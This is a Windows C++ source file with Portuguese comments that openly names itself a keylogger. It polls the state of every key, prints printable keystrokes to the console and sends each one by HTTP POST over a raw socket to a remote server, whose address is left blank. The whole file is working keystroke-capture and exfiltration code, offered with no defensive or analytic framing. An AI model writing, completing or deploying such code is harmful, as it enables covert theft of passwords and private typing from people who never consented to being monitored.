#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <string>

#pragma comment(lib, "ws2_32.lib") 

#define SERVER_IP ""          // IP do servidor   
#define SERVER_PORT 8080      // porta do servidor


void enviarTecla(SOCKET sock, int tecla) {
    char tecla_char = (char)tecla;


    std::string request = "POST / HTTP/1.1\r\n"
        "Host: " SERVER_IP "\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 1\r\n\r\n"
        + std::string(1, tecla_char) + "\r\n";


    send(sock, request.c_str(), request.size(), 0);
}


void conectarServidor(SOCKET& sock) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Erro ao criar socket\n";
        WSACleanup();
        exit(1);
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) < 0) {
        std::cerr << "Erro ao conectar ao servidor\n";
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
}

int main() {
    SOCKET sock;
    conectarServidor(sock);

    std::cout << "Keylogger rodando... (Pressione ESC para sair)\n";

    while (true) {
        for (int tecla = 8; tecla <= 255; tecla++) {
            if (GetAsyncKeyState(tecla) & 0x8000) {  
                if (tecla == VK_ESCAPE) { 
                    closesocket(sock);
                    WSACleanup();
                    return 0;
                }

                if (tecla >= 32 && tecla <= 126) { 
                    std::cout << "Tecla pressionada: " << (char)tecla << std::endl;  
                    enviarTecla(sock, tecla);  
                }
            }
        }
        Sleep(80);  
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
